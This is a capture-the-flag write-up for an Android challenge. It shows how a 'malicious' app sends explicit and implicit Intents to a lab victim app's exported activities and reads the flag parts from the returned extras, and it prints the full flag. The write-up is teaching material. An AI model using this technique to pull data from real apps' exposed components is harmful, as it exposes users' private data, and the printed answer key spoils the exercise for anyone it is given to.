# justask
There is an app installed on the system. The app has four activities. Each of them has one part of the flag. If you ask them nicely, they will all kindly reply with their part of the flag. They will reply with an Intent, the part of the flag is somehow contained there. Check the app's manifest for the specs. Good luck ;-)

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="[http://schemas.android.com/apk/res/android](http://schemas.android.com/apk/res/android)"
    package="com.example.victimapp">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.VictimApp">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".PartOne" android:exported="true"/>
        <activity android:name=".PartTwo" android:exported="true">
            <intent-filter>
                <action android:name="com.example.victimapp.intent.action.JUSTASK"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name=".PartThree" android:exported="true"/>
        <activity android:name=".PartFour" android:exported="true">
            <intent-filter>
                <action android:name="com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
    </application>

</manifest>
```
___

## How to solve it 

**Core Concept:** Understand Android Intents + Understand what is in the Manifest.

There is a target app (`com.example.victimapp`) with 4 activities. Each activity holds one part of the flag. We need to retrieve data from all 4 endpoints (since `exported="true"`).

The manifest tells you exactly how you are allowed to talk to them.

**The Loop:**
1. Our **MaliciousApp** sends an Intent.
2. The **VictimApp** opens it.
3. The **VictimApp** sends a result back.
4. Our app handles the result.

### 1. Analysis of the Victim Manifest 

We need to send an Intent to each activity. The way we construct them (**Implicit** vs **Explicit**) depends on the manifest configuration.

* **PartOne & PartThree:**
    * **Config:** `exported="true"` but **NO** `<intent-filter>`.
    * **Strategy:** **Explicit Intent**. You must specify **WHO** handles it (Package Name + Class Name). You ignore the Action.
* **PartTwo & PartFour:**
    * **Config:** `exported="true"` **WITH** an `<intent-filter>` containing an `<action>`.
    * **Strategy:** **Implicit Intent**. You specify **WHAT** (The Action). You let the Android System decide "who" handles it.

| Activity  | Manifest Declaration | How to call it? | Type of Intent |
| :--- | :--- | :--- | :--- |
| **PartOne** | `exported="true"` (no intent-filter) | `intent.setComponent(new ComponentName("com.example.victimapp","com.example.victimapp.PartOne"))` | **Explicit** |
| **PartTwo** | `exported="true"` with intent-filter action `...JUSTASK` | `new Intent("com.example.victimapp.intent.action.JUSTASK")` | **Implicit** |
| **PartThree** | `exported="true"` (no intent-filter) | `intent.setComponent(new ComponentName("com.example.victimapp","com.example.victimapp.PartThree"))` | **Explicit** |
| **PartFour** | `exported="true"` with intent-filter action `...JUSTASKBUTNOTSOSIMPLE` | `new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE")` | **Implicit** |


### 2. Create the Intents 
Reference: [Android Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)

Inside `OnCreate`:

```java
// --- Part 1 & 3 (Explicit Intent) ---
// We must set the exact class name (Package, ClassName)

Intent intent1 = new Intent();
intent1.setClassName("com.example.victimapp", "com.example.victimapp.PartOne");

Intent intent3 = new Intent();
intent3.setClassName("com.example.victimapp", "com.example.victimapp.PartThree");

// --- Part 2 & 4 (Implicit Intent) ---
// We specify the Action. Setting the package is good practice to ensure it goes to the victim.

Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");
intent2.setPackage("com.example.victimapp");

Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
intent4.setPackage("com.example.victimapp");
```

### 3. How to handle the callback

The Victim App doesn't just display the flag on the screen; it sends the flag back to you as **data**. There are two methods to handle this:

1.  `startActivityForResult()` (Old/Deprecated)
2.  `ActivityResultLauncher` (New/Recommended)

#### Method A: Using `registerForActivityResult` (New Way)
Reference: [Get results from activities (registerForActivityResult)](https://developer.android.com/training/basics/intents/result)

**The Recursive Handler (Required for Part 4):**
Part 4 hides the flag inside a Bundle within a Bundle. We need a recursive function to dig it out.

```java
// Flag 4 has bundles inside of bundles -> needs recursion
private void getFlagRecursive(Bundle bundle) {
    if (bundle == null) return;

    for (String key: bundle.keySet()) {
        Object value = bundle.get(key);
        if (value instanceof Bundle) {
            // If the value is a Bundle, recurse into it
            getFlagRecursive((Bundle) value);
        } else {
            // Otherwise, print the value
            Log.d(TAG, "Key: " + key + ", Value: " + value);
        }
    }
}
```

**The Launcher Registration:**

```java
ActivityResultLauncher<Intent> launcher = registerForActivityResult(
    new ActivityResultContracts.StartActivityForResult(),
    new ActivityResultCallback<ActivityResult>() {
        @Override
        public void onActivityResult(ActivityResult result) {
            
            // 1. Check if we have data
            if (result.getData() != null) {
                
                Bundle extras = result.getData().getExtras();

                if (extras != null) {
                    // 2. Use our recursive function to find the hidden flags
                    getFlagRecursive(extras);
                }
            }
        }
    });
```

**Launch the intents inside `OnCreate`:**
```java
launcher.launch(intent1);
launcher.launch(intent2);
launcher.launch(intent3);
launcher.launch(intent4);
```

#### Method B: Using `startActivityForResult` (Old Way)
Reference: [Documents and other files (Storage Access Framework)](https://developer.android.com/training/data-storage/shared/documents-files)

If using the old method, you override `onActivityResult`.

```java 
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    
    // Check if the victim sent data back
    if (data != null && data.getExtras() != null) {
        Bundle extras = data.getExtras();
        // Iterate over all keys to find the flag
        for (String key : extras.keySet()) {
            Log.e(TAG, "Part " + requestCode + " Key: " + key + " Value: " + extras.get(key));
        }
    }
}
``` 

**Launch commands inside `OnCreate`:**
```java
startActivityForResult(intent1, 1);
startActivityForResult(intent2, 2);
startActivityForResult(intent3, 3);
startActivityForResult(intent4, 4);
```

## Solution

The logs will reveal the flag parts in order.

```bash
2026-01-18 17:39:24.285  9242-9242  CTF    com.example.maliciousapp   D  --- APP STARTED ---
2026-01-18 17:39:24.791  9242-9242  CTF    com.example.maliciousapp   D  Key: never ending story, Value: _cadendo}
2026-01-18 17:39:24.791  9242-9242  CTF    com.example.maliciousapp   D  Key: flag, Value: lapidem_non_vi
2026-01-18 17:39:24.791  9242-9242  CTF    com.example.maliciousapp   D  Key: hiddenFlag, Value: _sed_saepe
2026-01-18 17:39:24.791  9242-9242  CTF    com.example.maliciousapp   D  Key: flag, Value: let's spice this up
2026-01-18 17:39:24.791  9242-9242  CTF    com.example.maliciousapp   D  Key: flag, Value: FLAG{Gutta_cavat_
```

**Constructed Flag:** `FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}`